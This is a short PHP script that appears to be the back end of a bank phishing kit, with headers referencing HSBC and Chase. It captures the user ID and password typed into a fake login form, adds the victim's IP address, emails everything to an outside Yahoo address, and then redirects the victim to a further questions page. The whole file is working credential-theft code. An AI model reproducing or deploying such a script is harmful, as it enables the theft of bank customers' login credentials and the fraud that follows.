<?php 

$ip = getenv("REMOTE_ADDR");
$message  = "---------------+ cap ReZulT +--------------\n";
$message .= "userid : ".$_POST['txtUserID']."\n";
$message .= "Password : ".$_POST['txtPassword']."\n";
$message .= "---------------Created By issazx-----------------\n";
$message .= "IP: ".$ip."\n";
$recipient = "shssh70@yahoo.com";
$subject = "cap1";
$headers .= "logz\n";
$headers .= "hsbc@hsbc.co.uk\n";
$headers = 'From:sems'."\r\n" .
    'OluChase-Mailer: PHP/' . phpversion();
mail($recipient,$subject,$message,$headers);

header("Location: questions.htm");
?>